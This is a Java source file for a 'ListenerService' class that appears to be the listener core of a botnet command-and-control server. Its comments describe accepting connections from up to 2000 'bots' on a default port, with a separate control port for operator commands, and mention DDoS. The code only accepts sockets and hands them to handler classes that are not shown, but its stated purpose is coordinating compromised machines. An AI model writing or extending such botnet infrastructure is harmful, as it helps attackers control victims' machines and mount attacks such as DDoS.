package lunarlight;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import lunarlight.ServingThreads.cmdConnThread;
import lunarlight.ServingThreads.serveConnThread;

public class ListenerService {
    private int listenPort; // will listen for "bots"
    private int controlPort; // here we can setup our server at runtime
    private Socket conn;
    private ExecutorService threadPool = Executors.newFixedThreadPool(2000); // so server can server up to 2000 bots simultaneously

    ListenerService(){ // so these will be default ports
        listenPort = 3333;
        controlPort = 3330;

    }
    ListenerService(int listenPort, int controlPort){ //otherwise we supply our own ports
        this.listenPort = listenPort;
        this.controlPort = controlPort;
    }

    public void init(){
        try {
            ServerSocket ListenSock = new ServerSocket(this.listenPort);
            //ServerSocket controlSock = new ServerSocket(this.controlPort);
            cmdConnThread cmdConn = new cmdConnThread(new ServerSocket(this.controlPort));// we cant rly DDOS that
            cmdConn.start(); // first we execute server setup listener
            while (true) { // then for other clients
                this.conn = ListenSock.accept();
                execThread(this.conn);
            }

        }
        catch (java.io.IOException ex) {
            System.out.println(ex);
        }

    }
    private void execThread(Socket c) { //method executes thread for every connection, except command
        Callable<Void> task = new serveConnThread(c);
        threadPool.submit(task);
    }



}
